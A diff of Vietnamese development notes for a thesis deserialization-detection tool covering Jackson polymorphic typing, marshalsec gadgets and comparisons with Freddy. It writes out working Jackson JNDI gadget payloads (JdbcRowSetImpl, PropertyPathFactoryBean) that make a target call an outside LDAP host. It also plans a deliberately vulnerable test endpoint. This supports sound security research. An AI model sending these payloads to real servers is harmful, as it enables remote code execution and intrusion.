@@ -1,5 +1,314 @@
 # Ghi chú tiến độ — EthicalQuoc
 
+**[THÊM] Gadget thứ 3 cho `JACKSON_OOB_GADGETS`: `com.mchange.v2.c3p0.JndiRefForwardingDataSource` (c3p0).**
+
+Verify từ source thật `mbechler/marshalsec` `Jackson.java` `makeRefDataSource()`: field phẳng, đơn
+giản y hệt `JdbcRowSetImpl` — `{"jndiName":"ldap://X/a","loginTimeout":"0"}`. Giờ tool sinh **3**
+payload OOB-confirmation cho Jackson (trước là 2). Verify: `json.loads()` cả 3 không lỗi, test suite
+**88/88 pass**.
+
+**[QUYẾT ĐỊNH PHẠM VI — 4 gadget còn lại trong 7 gadget `marshalsec.Jackson`, LÝ DO KHÁC NHAU cho từng cái, không phải "ngại làm":**
+
+| Gadget | Vì sao KHÔNG thêm |
+|---|---|
+| `DefaultBeanFactoryPointcutAdvisor` (Spring) | Phải bọc **2 instance trong 1 `java.util.HashSet`** (`writeCollection(HashSet.class, obj1, obj2)`, 1 object rỗng) — kỹ thuật hash-collision để ép JVM tự gọi `equals()`/`hashCode()` lúc insert. CHƯA trace được chính xác vì sao cần đúng 2 instance để hoạt động — sau bài học payload `PropertyPathFactoryBean` thiếu field `beanFactory` (xem mục dưới), chủ động KHÔNG đoán mò field này khi chưa verify chắc cơ chế. |
+| `WrapperConnectionPoolDataSource` (c3p0) | Cần tham số `codebase`+`class` — cơ chế tải `.class` từ xa qua HTTP (kiểu RMI codebase), không phải JNDI lookup đơn thuần. Phải tự host 1 file `.class` thật ở server HTTP — đúng loại hạ tầng "server độc hại" đã xác định KHÔNG làm. |
+| `UnicastRemoteObject` | Source tự ghi `@Args(minArgs = 0, noTest = true) // random port only` — không nhận tham số JNDI URL nào, không có domain để nhét OOB canary vào. |
+| `TemplatesImpl` (XSLT) | Source tự ghi `noTest = true // chỉ chạy <JDK 8u45 HOẶC có upstream xalan` — RCE tự chứa bytecode XSLT, không qua JNDI, cơ chế hoàn toàn khác (build `.class`, nhúng bytecode base64) — không khớp mẫu "đổi 1 domain" của 3 gadget đã thêm. |
+
+---
+
+**[PLAN — NGÀY MAI] Tạo test case thật cho Jackson, test thử với CVE cụ thể trên `java-app`.**
+
+**Phát hiện quan trọng cần biết TRƯỚC khi làm (đã verify, không đoán)**: `java-app/pom.xml` không tự pin
+Jackson, nên version thật đến từ Spring Boot `2.7.18` BOM → `jackson-bom.version = 2.13.5` (verify bằng
+cách tải thẳng `spring-boot-dependencies-2.7.18.pom` từ Maven Central). Đọc source thật
+`SubTypeValidator.java` tag `jackson-databind-2.13.5`: **cả 3 gadget đã thêm vào `JACKSON_OOB_GADGETS`
+đều bị chặn nội bộ** — `com.sun.rowset.JdbcRowSetImpl` (chặn theo tên, comment `[databind#1680]`),
+`org.springframework.beans.factory.config.PropertyPathFactoryBean` (chặn theo tên, `[databind#1737]`),
+`com.mchange.v2.c3p0.JndiRefForwardingDataSource` (chặn theo rule `prefix com.mchange.v2.c3p0. + suffix
+"DataSource"`, dòng 282-291). Nghĩa là: dù endpoint Java có bật `enableDefaultTyping()` thật, cả 3 payload
+hiện tại vẫn sẽ bị Jackson tự ném `InvalidTypeIdException`, KHÔNG có JNDI lookup nào xảy ra — test live sẽ
+cho kết quả âm tính giả nếu không xử lý bước này trước.
+
+**Việc cần làm ngày mai, theo thứ tự:**
+
+1. **Quyết định hướng xử lý version** (phải làm trước, quyết định mọi bước sau):
+   - Phương án A (khuyến nghị, nhất quán với tiền lệ đã có): pin `jackson-databind` về 1 version CŨ HƠN
+     mốc blacklist thêm 3 class trên — tức **trước** `[databind#1680]`/`[databind#1737]` (khoảng
+     jackson-databind 2.7.x-2.8.8, giai đoạn ngay sau CVE-2017-7525/bug #1599 công bố nhưng trước khi
+     patch). Pin tường minh trong `pom.xml` của `java-app`, ghi rõ comment "intentionally vulnerable for
+     test case" — giống hệt cách `commons-collections:3.2.1` đã pin cho ysoserial trước đó (xem
+     [Keep parallel code consistent]). Cần tra đúng version đầu tiên add từng block để chọn mốc chính xác
+     (không đoán).
+   - Phương án B (khó hơn, để dự phòng nếu A có vướng mắc dependency): giữ nguyên 2.13.5, tìm gadget KHÔNG
+     nằm trong blacklist của version này — rủi ro cao hơn vì phải tự nghiên cứu/verify 1 gadget mới, không
+     có sẵn trong 7 gadget `marshalsec.Jackson` đã liệt kê (toàn bộ 7 cái tới nay đều dính 1 trong các rule
+     chặn ở trên, cần double-check riêng 2 cái còn lại `WrapperConnectionPoolDataSource`/`TemplatesImpl`
+     trước khi chọn hướng này).
+
+2. **Thêm endpoint Jackson thật vào `java-app`** (sau khi đã chốt version ở bước 1):
+   - Tạo 1 tính năng hợp lý (vd "import cấu hình thông báo"/"webhook config") dùng `ObjectMapper` với
+     `enableDefaultTyping()`/`activateDefaultTyping()` đọc JSON body từ request — đúng mẫu lỗ hổng CVE-2017-
+     7525 gốc.
+   - **BẮT BUỘC thêm UI trigger thật** cho endpoint này (theo [feedback-new-api-must-be-used-in-web]) —
+     không chỉ làm endpoint test bằng curl.
+
+3. **Test end-to-end với EthicalQuoc**:
+   - Capture HAR qua UI mới → `scan` → `analyze` → `assess` — xác nhận pipeline tự nhận ra
+     `subtype = "Jackson Polymorphic Typing"`, sinh đúng 3 payload OOB.
+   - Chạy thật với `oob_domain` trỏ Interactsh — xác nhận có callback LDAP/DNS thật trong log Interactsh
+     (không chỉ giả định) — đây là bước khác biệt so với trước giờ (các case Jackson mới chỉ test bằng
+     payload tĩnh, chưa bắn thật vào target đang chạy).
+   - Viết test case mới trong `TestCase/` cho luồng end-to-end này (hiện `TestJacksonPolymorphicDetection`
+     chỉ test đơn vị, chưa có test tích hợp với HAR/target thật).
+
+4. **CVE cụ thể để tham chiếu khi viết báo cáo/luận văn**: CVE-2017-7525 (bug gốc jackson-databind #1599,
+   gadget qua c3p0 — bài viết tham khảo đã thấy trong source `makeTemplates()`:
+   https://adamcaudill.com/2017/10/04/exploiting-jackson-rce-cve-2017-7525/). Cần tự đọc writeup này
+   trước khi trích dẫn trong báo cáo (chưa đọc, chỉ mới thấy link trong comment source).
+
+5. Sau khi xong, ghi lại `note.md` như thường lệ: version Jackson đã pin + lý do, endpoint mới, kết quả
+   live test (có/không nhận được callback), test case mới thêm.
+
+---
+
+**[GHI CHÉP KIẾN THỨC — Q&A phiên này, phục vụ ôn lại khi bảo vệ luận văn]**
+
+1. **`JAVA_CHAIN_MAP` trong `payloadMutation.py` KHÔNG phải "sink → gadget"** — key (`CommonsCollections`,
+   `TemplatesImpl`, `Spring`...) được so khớp với `exploit_type` (mô tả), không phải với sink. Toàn bộ map
+   chỉ phục vụ **1 sink duy nhất** (`ObjectInputStream.readObject()`), chỉ khác nhau ở CHỌN chain nào của
+   `ysoserial`. Jackson nằm NGOÀI map này hoàn toàn (route riêng qua `jackson_manual`), vì Jackson đọc
+   JSON — không thể nhét byte `ysoserial` sinh ra vào được.
+
+2. **Vì sao Jackson "cứ dính JNDI"**: Jackson default/polymorphic typing chỉ gọi được **setter/constructor
+   một lần** khi bind JSON — KHÔNG có cơ chế callback dây chuyền như `readObject()` của Java serialization
+   (không có `hashCode()`→`LazyMap`→`ChainedTransformer` nhiều tầng). Muốn RCE, attacker cần 1 class có
+   sẵn trên classpath mà **chỉ 1 lần gọi setter đã tự gây hại** — nhóm lớp JNDI datasource
+   (`JdbcRowSetImpl`, `PropertyPathFactoryBean`, c3p0...) là nhóm PHỔ BIẾN DUY NHẤT thoả điều kiện này
+   (bản thân setter tự gọi `InitialContext().lookup()`). Không phải Jackson "thích" JNDI về bản chất — mà
+   JNDI là nhóm lớp tiện lợi nhất có sẵn. Bằng chứng ngược lại: `TemplatesImpl` KHÔNG tự kích hoạt bằng
+   setter (cần gọi `newTransformer()` — bước 2), nên phải mượn thêm lớp `BadAttributeValueExpException`
+   (có `toString()` tự gọi `val.toString()`) làm "trampoline" giả lập callback chain — xác nhận qua file
+   thật `Finereport_Jackson.java` (plugin `Java-Chains/chains-plugin-demo`): comment ghi rõ
+   `"BadAttributeValueExpException -> jackson -> Templates"`.
+
+3. **`InitialContext().lookup(url)` — `url` ở đây không phải URL tuỳ ý**, mà là tham số `getDataSourceName()`
+   (tên biến theo spec JDBC `RowSet`). JNDI có cơ chế "URL Context Factory": nếu chuỗi có dạng
+   `scheme://host/path` (`ldap://`, `rmi://`, `dns://`...), `lookup()` tự nhận diện và forward tra cứu ra
+   naming service ở ĐÚNG địa chỉ đó thay vì tra nội bộ — đây chính là cơ chế RCE (và cũng là cơ chế
+   Log4Shell `${jndi:ldap://...}`). Verify bằng source thật OpenJDK
+   `com.sun.rowset.JdbcRowSetImpl.connect()` dòng 612-629: `ctx.lookup(getDataSourceName())`.
+
+4. **Detect Jackson KHÔNG cần JNDI** — `JACKSON_PATTERNS` trong `finderprint.py` chỉ match HÌNH DẠNG JSON
+   (`["class",{...}]`/`@class`/`@type`), không có `jndi`/`ldap` trong pattern. Bằng chứng: payload
+   `["java.util.ArrayList",[1,2,3]]` (không hề có JNDI) vẫn được detect đúng subtype "Jackson Polymorphic
+   Typing". JNDI chỉ cần cho bước XÁC NHẬN khai thác thật (OOB callback) — 2 việc tách biệt hoàn toàn.
+
+5. **Thuật ngữ trang Interactsh là "LDAP", không phải "JNDI"** — verify từ README thật
+   `projectdiscovery/interactsh`: mục `## LDAP Interaction`, flag CLI `-ldap`, log `[LDAP] Listening on...`.
+   "JNDI" chỉ xuất hiện 1 lần, trong ngữ cảnh liệt kê kỹ thuật tấn công phía client (không phải tên dịch
+   vụ). Lý do: Interactsh là hạ tầng TẦNG MẠNG (DNS/HTTP/SMTP/LDAP) — không biết và không cần biết tầng
+   ứng dụng phía trên (JNDI của Java) đã dùng cách nào kích hoạt ra kết nối đó. JNDI (API Java) → tạo kết
+   nối LDAP → Interactsh (lắng nghe giao thức) chỉ log gói LDAP thô.
+
+6. **`GadgetBuilder` (NordSec 2025, Umeå University, Bruno Kreyssig et al.) — đọc trực tiếp PDF paper**:
+   là bản overhaul/thay thế `ysoserial` (gộp 31 chain ysoserial + 29 chain nguồn khác = 303 biến thể nhờ
+   tách 3 fragment Trampoline/MainChain/SinkAdapter), nhưng **CHỈ xoay quanh sink `ObjectInputStream`**,
+   không nhắc gì tới Jackson/JSON — không giải quyết được bài toán Jackson của mình. Quyết định: KHÔNG
+   tích hợp (research artifact quá mới, chưa kiểm chứng rộng, không giải quyết đúng vấn đề đang vướng).
+
+7. **`vulhub/java-chains`** — đã cố đọc source engine thật (`git clone` đúng tag `v2.0.0-beta7` mà
+   `deps/api/README.md` ghi là nguồn build API) — xác nhận: **repo công khai hoàn toàn KHÔNG có code
+   `.java`** nào (chỉ docs/Docker/CI), kể cả đúng tag đó. Commit mới nhất ghi thẳng "fix public release
+   surface verification" — repo được dọn có chủ đích để chỉ phơi bề mặt release. Engine thật (logic build
+   gadget chain, `GadgetChain.doCreate()`) là CLOSED-SOURCE, chỉ phân phối dạng `.jar` đã compile. Phần
+   công khai duy nhất đọc được là plugin SDK demo (`Java-Chains/chains-plugin-demo`) — code GỌI VÀO API đã
+   compile sẵn, không phải implementation.
+
+---
+
+**[THÊM] Jackson `jackson_manual` giờ sinh payload OOB-CONFIRMATION-ONLY (không còn `return []`), cùng mẫu với `_mutate_yaml_java()` (SnakeYAML Java) đã có từ trước.**
+
+Lý do: detect Jackson (`JACKSON_PATTERNS`) không hề cần JNDI — chỉ cần đúng hình dạng JSON
+(`["class",{...}]`/`@class`). JNDI chỉ cần cho bước xác nhận khai thác thật qua tín hiệu OOB
+(callback LDAP/DNS quan sát qua Interactsh/Collaborator) — tách biệt hoàn toàn khỏi bước detect.
+Verify nguồn thật `com.sun.rowset.JdbcRowSetImpl.connect()` (OpenJDK, dòng 612-629):
+`ctx.lookup(getDataSourceName())` — nếu giá trị set vào có dạng URL JNDI (`ldap://`, `rmi://`...),
+JNDI tự forward lookup ra server ngoài do attacker kiểm soát → đây chính là cơ chế RCE.
+
+**Thêm `_mutate_jackson_oob()`** trong [payloadMutation.py](Analyze/payloadMutation.py), wire vào
+`mutate()` cho `probe == "jackson_manual"`:
+- Không có `oob_domain` cấu hình → trả về `[{"error": ..., "hint": ...}]` (giống style báo lỗi các
+  nhánh khác khi thiếu config/tool).
+- Có `oob_domain` → sinh 2 payload JSON (`JdbcRowSetImpl` + `PropertyPathFactoryBean`, 2 gadget phổ
+  biến nhất trong 7 gadget `marshalsec.Jackson` đã liệt kê ở mục dưới), `dataSourceName`/
+  `targetBeanName` trỏ `ldap://{oob_domain}/a`. Mỗi payload có note ghi rõ: **chỉ xác nhận có
+  deserialize xảy ra qua tín hiệu OOB, KHÔNG tự đạt RCE** — vì cần thêm rogue LDAP/RMI server trả
+  `Reference` + host sẵn 1 class độc hại, nằm ngoài phạm vi tool (tool không tự dựng/chạy server đó).
+- Không gọi `java`/subprocess nào — chỉ string JSON + base64, giống hệt cách `_mutate_java_urldns()`
+  build canary DNS.
+
+Test: thêm `test_jackson_probe_without_oob_domain_returns_no_payload` và
+`test_jackson_probe_with_oob_domain_generates_confirmation_payload_only` (thay cho test cũ
+`test_jackson_probe_generates_no_auto_payload` đã khóa hành vi `return []` — nay không còn đúng).
+Docstring class `TestJacksonPolymorphicDetection` cũng viết lại cho khớp. Verify thật bằng script
+độc lập (set `ETHICALQUOC_OOB_DOMAIN=abc123.oast.fun`): payload base64 decode ra đúng
+`["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"ldap://abc123.oast.fun/a","autoCommit":true}]`.
+Suite: **88/88 pass**.
+
+**[FIX NGAY SAU ĐÓ — tự phát hiện lỗi khi bị hỏi "tham khảo ở đâu hay tự chế"]** Payload
+`PropertyPathFactoryBean` ban đầu CHỈ có `targetBeanName`+`propertyPath` — bị thiếu field bắt buộc
+`beanFactory` (nested `SimpleJndiBeanFactory` với `shareableResources`). Không có field này thì
+`targetBeanName` chỉ là 1 chuỗi vô hại, **không có gì thật sự gọi JNDI** — payload ban đầu KHÔNG hoạt
+động, dù JdbcRowSetImpl (payload còn lại) đã verify đúng từ trước. Phát hiện bằng cách `git clone`
+thật `mbechler/marshalsec`, đọc `Jackson.java` dòng 106-112 (`makePropertyPathFactory`) +
+dòng 134-136 (`makeSpringJndiBeanFactory`) + dòng 281-285 (`writeProperty` — xác nhận field lồng
+được nhúng dạng mảng JSON thật, không phải chuỗi escape). Cấu trúc đúng, đã verify + sửa:
+```json
+["org.springframework.beans.factory.config.PropertyPathFactoryBean",
+ {"targetBeanName":"ldap://X/a","propertyPath":"foo",
+  "beanFactory":["org.springframework.jndi.support.SimpleJndiBeanFactory",
+                 {"shareableResources":["ldap://X/a"]}]}]
+```
+Verify lại: JSON hợp lệ (`json.loads()` không lỗi), test suite **88/88 pass** không đổi (test không
+hard-code field cũ nên không vỡ, nhưng cũng không tự phát hiện được lỗi thiếu field này — ghi chú để
+nhớ: lần sau cần test assert đủ field bắt buộc của gadget, không chỉ assert "có domain trong payload").
+
+---
+
+**[FIX] `normalize()` vứt bỏ wrapper Jackson — bug đã nêu ở mục dưới (dòng "GIỚI HẠN KIẾN TRÚC") NAY ĐÃ SỬA.**
+
+Nguyên nhân chính xác (verify bằng cách in điểm số thật, không đoán): `_serialized_score()` trong
+[normalize.py](Analyze/normalize.py) chấm cả cục wrapper `["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"ldap://x/a",...}]`
+= **0.0 điểm** (với nó đây chỉ là JSON thường, `_is_generic_json()` = True), trong khi chuỗi lá
+`"ldap://x/a"` được **0.5 điểm** (khớp `WRAPPER_DANGEROUS`). Lá cao điểm hơn → `collapse()` giữ lá, vứt
+wrapper → `Fingerprint` (chạy sau normalize) không còn thấy dấu hiệu Jackson.
+
+Fix — 2 chỗ:
+- [normalize.py](Analyze/normalize.py) `_serialized_score()`: thêm luật nếu khớp `signatures.JACKSON_PATTERNS`
+  thì **+8 điểm**. Giờ wrapper (8đ) > lá (0.5đ) → `normalize()` giữ nguyên cả wrapper.
+- [finderprint.py](Analyze/finderprint.py) `_detect_java()`: khi khớp `JACKSON_PATTERNS`, **ép** `subtype =
+  "Jackson Polymorphic Typing"` (trước đó dùng `subtype = subtype or ...` — nhường cho gadget keyword như
+  `springframework`/`ldap` khớp trước). Lý do: cấu trúc wrapper quyết định TRANSPORT (JSON qua Jackson), nên
+  dù bên trong chứa gadget Spring/JNDI keyword, vẫn phải báo đúng là Jackson — vì `ysoserial` không tạo ra
+  được payload dạng JSON này.
+
+Verify thật — 3 payload test lại:
+| Payload | Trước fix | Sau fix |
+|---|---|---|
+| `["com.sun.rowset.JdbcRowSetImpl",{...ldap...}]` | normalize còn lại `ldap://x/a` → nhãn sai "JNDI Injection"/ysoserial | giữ nguyên wrapper → đúng "Jackson Polymorphic Typing" / probe `jackson_manual` |
+| `{"@class":"org.springframework...PropertyPathFactoryBean",...}` | nhãn sai "Spring Gadget"/ysoserial | đúng "Jackson Polymorphic Typing" / `jackson_manual` |
+| `{"username":"wiener","role":"user"}` (JSON thường) | Unknown | vẫn Unknown (không false-positive) |
+
+Test: `test_known_limitation_normalize_strips_jackson_wrapper` (khóa hành vi CŨ, nay sai) đã đổi tên/viết lại
+thành `test_real_gadget_wrapper_survives_normalize_and_is_detected` (khóa hành vi ĐÚNG). Suite: **87/87 pass**.
+
+Phần sinh payload khai thác Jackson (`mutate()` với probe `jackson_manual`) **vẫn** rơi vào `return []` —
+detection-only, không đổi. Lý do giữ nguyên detection-only: xem mục research "Java-Chains/marshalsec" bên
+dưới.
+
+---
+
+**[RESEARCH — so sánh công cụ, phục vụ bảo vệ luận văn] Vì sao Jackson chỉ detection-only là lựa chọn hợp
+lý, không phải thiếu sót — đối chiếu với 2 công cụ ngoài, đọc source/README thật, không suy đoán.**
+
+1. **`marshalsec.Jackson`** (đọc trực tiếp `Jackson.java` từ `mbechler/marshalsec`, branch `master`):
+   đúng **7 gadget chain** — `makeJdbcRowSet` (JdbcRowSetImpl, JNDI), `makePropertyPathFactory` (Spring,
+   JNDI), `makeBeanFactoryPointcutAdvisor` (Spring, JNDI), `makeRefDataSource` (c3p0, JNDI),
+   `makeWrapperConnPool` (c3p0, tải class qua URL — không cần JNDI), `makeUnicastRemoteObject` (RMI,
+   `noTest=true`), `makeTemplates` (TemplatesImpl/XSLT, tự chứa nhưng `noTest=true` — chỉ chạy JDK <8u45
+   hoặc Xalan upstream). **5/7 cần JNDI server ngoài, 1/7 cần HTTP server ngoài, 1/7 tự chứa nhưng không ổn
+   định** — khớp đúng 1-1 với `JACKSON_DANGEROUS_CLASSES` đã có trong [signatures.py](Utility/signatures.py)
+   (không thiếu class nào). Tức là ngay cả tác giả marshalsec cũng không coi gadget Jackson nào "tự động,
+   đáng tin cậy 100%".
+
+2. **`vulhub/java-chains`** (đọc README + CHANGELOG thật, 2.2k star, bản `2.0.0-beta3`): là **cả một
+   platform** (không phải lib) — bundle sẵn web UI + server JNDI HTTP/LDAP/RMI + FakeMySQL + JRMP listener
+   chạy kèm, đứng trên vai ysoserial + marshalsec + ysomap + JNDIMap + MemShellParty + PPPYSO. Từ
+   `1.4.1`: có cả Fastjson. Từ `2.0.0-beta3`: có `/api` (session + `X-Api-Token`) và `java-chains-cli` để
+   tự động hoá. Đây chính là thứ **giải quyết được** khoảng trống "hạ tầng rogue JNDI/RMI/HTTP server" mà
+   marshalsec một mình không làm (marshalsec chỉ cho class `LDAPRefServer`/`RMIRefServer`, còn phải tự host
+   HTTP server + class độc hại).
+
+**Ý nghĩa cho thesis**: một đội mã nguồn mở với nhiều người đóng góp, nhiều năm phát triển, phải xây **hẳn
+một platform riêng** mới giải quyết trọn vẹn bài toán "tự động hoá payload + hạ tầng JNDI/Jackson end-to-
+end". Điều này củng cố quyết định phạm vi: để Jackson ở mức **detection-only** trong tool thesis là lựa
+chọn có cơ sở so sánh thực tế, không phải do thiếu khả năng — có thể trích dẫn java-chains làm ví dụ khi
+bảo vệ, nếu bị hỏi "sao không tự exploit Jackson luôn".
+
+**Tài liệu tham khảo (nguồn gốc, để tra lại sau này):**
+- marshalsec — source code: https://github.com/mbechler/marshalsec
+  - File đã đọc trực tiếp: https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/Jackson.java
+  - Paper gốc giới thiệu kỹ thuật (Moritz Bechler & Christian Schneider, 2017): "Java Unmarshaller Security" — https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf (đã verify link tồn tại, HTTP 200 — chưa tự đọc nội dung paper)
+- vulhub/java-chains — repo: https://github.com/vulhub/java-chains
+  - README (bản tiếng Anh đã đọc): https://github.com/vulhub/java-chains/blob/main/README.md
+  - CHANGELOG (lịch sử tính năng, đã đọc để xác nhận Fastjson + `/api` + CLI): https://github.com/vulhub/java-chains/blob/main/CHANGELOG.md
+  - Docs site (link README ghi, lúc truy cập bị 404 — lưu ý nếu tra lại): https://java-chains.github.io/en/docs/guide → redirect https://java-chains.vulhub.org/en/docs/guide
+- Các project java-chains credit (chưa tự đọc source, chỉ biết qua README credit — nếu cần trích dẫn sâu hơn thì phải tự đọc):
+  - https://github.com/ReaJason/MemShellParty
+  - https://github.com/wh1t3p1g/ysomap
+  - https://github.com/qi4L/JYso
+  - https://github.com/X1r0z/JNDIMap
+  - https://github.com/Whoopsunix/PPPYSO
+
+**Giới hạn ngoài phạm vi, xác nhận lại, không thay đổi**: không tích hợp marshalsec/java-chains để tool tự
+sinh payload JNDI RCE hoàn chỉnh — việc này đòi hỏi tool phải tự dựng rogue LDAP/RMI/HTTP server và serve
+class độc hại, nằm ngoài phạm vi một tool phát hiện (detection), đúng ranh giới mà các Burp extension cộng
+đồng (Freddy, Java-Deserialization-Scanner — xem mục bên dưới) cũng tự đặt ra.
+
+---
+
+**[THÊM — DETECTION-ONLY] Nhận diện Jackson default/polymorphic typing (chỉ PHÁT HIỆN, KHÔNG auto-sinh payload khai thác). Kèm 1 giới hạn kiến trúc đã xác nhận thật — ĐÃ SỬA, xem entry [FIX] ở đầu file.**
+
+**Đã thêm:**
+- [signatures.py](Utility/signatures.py): `JACKSON_PATTERNS` (WRAPPER_ARRAY `["pkg.Class",{...}]`, `@class`/`@type`) + `JACKSON_DANGEROUS_CLASSES` (jdbcrowsetimpl, templatesimpl, propertypathfactorybean, c3p0...). Thêm Jackson vào `looks_like_serialized()` để payload JSON Jackson lọt qua filter.
+- [finderprint.py](Analyze/finderprint.py) `_detect_java()`: nếu khớp `JACKSON_PATTERNS` → subtype "Jackson Polymorphic Typing", +5 điểm (+4 nếu có dangerous class).
+- [ExploitabilityAnalysis.py](Analyze/ExploitabilityAnalysis.py) `_analyze_java()`: nếu subtype là Jackson → exploit_type "Jackson Polymorphic Deserialization", probe `jackson_manual`, note hướng dẫn tự dùng marshalsec.Jackson. KHÔNG route sang ysoserial.
+- `mutate()`: `jackson_manual` rơi vào `return []` — detection-only, KHÔNG weaponize tự động (phần sinh payload RCE Jackson KHÔNG làm).
+- Test: thêm `TestJacksonPolymorphicDetection` (3 test). Suite: **87/87 pass**.
+
+**GIỚI HẠN KIẾN TRÚC đã xác nhận THẬT — ĐÃ SỬA (xem entry [FIX] ở đầu file), giữ nguyên đoạn dưới đây làm hồ sơ debug gốc:** `DataNormalizer.normalize()` làm phẳng JSON + rút các chuỗi lá rồi chấm điểm giữ cái "đáng giá" nhất, **vứt bỏ wrapper + tên class Jackson**. Verify thật: `normalize('["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"ldap://x/a",...}]')` → trả về đúng `["ldap://x/a"]`. Nên với payload gadget Jackson THẬT (JdbcRowSetImpl+ldap, Spring PropertyPathFactoryBean), `Fingerprint` (chạy SAU normalize) không còn thấy dấu hiệu Jackson → signature không khớp. Các payload đó vẫn bị flag nhưng qua `ldap://`/`springframework` keyword → gắn nhãn "JNDI Injection"/"Spring Gadget" + probe ysoserial (SAI transport, SAI gợi ý công cụ vì ysoserial không tạo được JSON Jackson). Signature Jackson chỉ thắng khi wrapper sống sót qua normalize (payload không có chuỗi lá điểm cao hơn, vd `["java.util.ArrayList",[1,2,3]]`). Muốn fix đúng cần detect Jackson TRƯỚC normalize (trên `cleaned_value`) — động vào luồng chung main.py/debug_pipeline, để sau. `test_known_limitation_normalize_strips_jackson_wrapper` khóa lại hành vi hiện tại để ai sửa normalize sau này thấy nó đổi.
+
+**Phần KHÔNG làm:** tích hợp marshalsec để tool TỰ sinh payload khai thác Jackson (RCE) — ngoài phạm vi, không thực hiện. Endpoint Jackson vulnerable trong java-vuln-app + UI trigger cũng chưa thêm (chưa có target thật để verify live detection).
+
+**[PHÁT HIỆN THÊM] `marshalsec` — công cụ lấp đúng khoảng trống Hessian/Kryo/Castor/BlazeDS/SnakeYAML/XStream mà `ysoserial` không làm được. Hiện tool KHÔNG tích hợp cái này — giới hạn thật, đã xác nhận bằng cách clone source (`mbechler/marshalsec`), không suy đoán.**
+
+README xác nhận: `java -cp marshalsec.jar marshalsec.<Marshaller> [-a] [<gadget_type> [<args>]]`, hỗ trợ đúng 13 "Marshaller": `BlazeDSAMF(0|3|X)`, `Hessian|Burlap`, `Castor`, `Jackson`, `Java`, `JsonIO`, `JYAML`, `Kryo`, `KryoAltStrategy`, `Red5AMF(0|3)`, `SnakeYAML`, `XStream`, `YAMLBeans` — khớp gần như y hệt list module Java của Freddy (xác nhận Freddy build payload dựa theo kỹ thuật marshalsec). Marshalsec CŨNG hỗ trợ "System Command Execution" (`cmd` argument) y hệt cách `ysoserial` nhận lệnh — không chỉ JNDI callback.
+
+**Ý nghĩa cho thesis**: nếu được hỏi "sao không xử lý được Hessian/Kryo/Castor..." — câu trả lời đúng là: kiến trúc hiện tại (`_run_ysoserial()` trong `payloadMutation.py`) chỉ tích hợp `ysoserial` (chỉ phủ `ObjectInputStream` gốc) — muốn mở rộng cần tích hợp THÊM `marshalsec` theo đúng pattern y hệt (gọi subprocess, truyền marshaller+gadget+command) — đây là hướng mở rộng khả thi, cụ thể, không phải "không làm được", chỉ là NGOÀI PHẠM VI hiện tại của thesis.
+
+**[ĐÍNH CHÍNH QUAN TRỌNG] Freddy KHÔNG hẹp hơn tool mình — nó rộng hơn theo 1 trục khác (số thư viện serialize trong CÙNG ngôn ngữ), tool mình chỉ rộng hơn theo trục NGÔN NGỮ. User tự phát hiện ra khi đếm lại số module Freddy.**
+
+Đếm chính xác: Freddy có **20 module Java** (BlazeDS AMF0/AMF3/AMFX, Burlap, Castor, FlexJson, Genson, Hessian, Jackson, JsonIO, JYAML, Kryo+KryoAltStrategy, ObjectInputStream, Red5 AMF0/AMF3, SnakeYAML, XmlDecoder) + **13 module .NET** = **33 thư viện serialize cụ thể**, mỗi cái 1 signature + exploit payload riêng. Grep lại toàn bộ code tool mình — **không có** Hessian/Kryo/Castor/Burlap/BlazeDS/Red5/XmlDecoder/JYAML/Genson/FlexJson/JsonIO ở đâu cả. Tool mình chỉ nhận diện "trông giống Java" qua 1 signature chung (magic bytes `AC ED 00 05`) — tương đương đúng 1 module (`ObjectInputStream`) trong số 20 của Freddy.
+
+**Framing ĐÚNG, PHẢI DÙNG khi trình bày** (không được nói "tool mình bao phủ rộng hơn" chung chung — sai, dễ bị bắt bẻ): rộng/hẹp theo **2 trục riêng biệt**:
+- Trục **NGÔN NGỮ/ECOSYSTEM**: tool mình rộng hơn — 7 ecosystem (PHP, Java, Python Pickle, YAML, .NET, Node.js, Ruby) vs Freddy chỉ 2 (Java, .NET).
+- Trục **THƯ VIỆN cụ thể trong CÙNG 1 ngôn ngữ**: Freddy SÂU hơn hẳn — 33 thư viện serialize riêng biệt (Hessian/Kryo/Castor/BlazeDS...) vs tool mình gom chung "Java" thành 1 nhánh duy nhất.
+
+**[THAM KHẢO BẢO VỆ LUẬN VĂN — bổ sung, đọc THẬT source code 3 extension, không chỉ docs]** `git clone` thật `nccgroup/freddy`, `federicodotta/Java-Deserialization-Scanner`, `PortSwigger/php-object-injection-check` về đọc — phát hiện chính xác hơn hẳn:
+
+- **Freddy** ([ObjectInputStreamModule.java](https://github.com/nccgroup/freddy/blob/master/src/nb/freddy/modules/java/ObjectInputStreamModule.java)): KHÔNG gọi `ysoserial` lúc chạy — chỉ có **2 payload gadget CỐ ĐỊNH, mã hoá cứng trong source** (CommonsBeanutils qua JNDI/LDAP, XBean qua HTTP), chỉ ghép hostname Collaborator vào 1 offset byte cố định trong payload có sẵn — KHÔNG build lại object graph, KHÔNG chạy được lệnh OS tuỳ ý (chỉ nhét được 1 URL JNDI/HTTP). Confidence 3 mức `CERTAIN/FIRM/TENTATIVE` — **CÓ tự động gán "Certain"** (có tự confirm, ngược triết lý tool mình). Xác nhận qua liệt kê thư mục: Freddy chỉ có đúng `java/` và `dotnet/` — "SnakeYAML" trong đó là thư viện YAML của JAVA, không phải PyYAML Python. Không có `php/`/`python/`/`ruby/`/`node/`.
+- **Java Deserialization Scanner**: grep thấy có gọi thật `java -jar ysoserial.jar` (`BurpExtender.java` dòng ~1853-1866) — nhưng nằm trong tab "exploitation" thao tác TAY (user tự nhập path, tự chọn chain, tự bấm) — không phải pipeline tự động.
+- **PHP Object Injection Check** (đọc hết 250 dòng `BurpExtender.java`): chỉ 1 kỹ thuật — gửi object `PDO` rỗng lợi dụng `__wakeup()` built-in PHP luôn throw lỗi để DETECT có `unserialize()` hay không — KHÔNG tích hợp `phpggc`, không khai thác gì thêm, không có phân tích format/fingerprint.
+
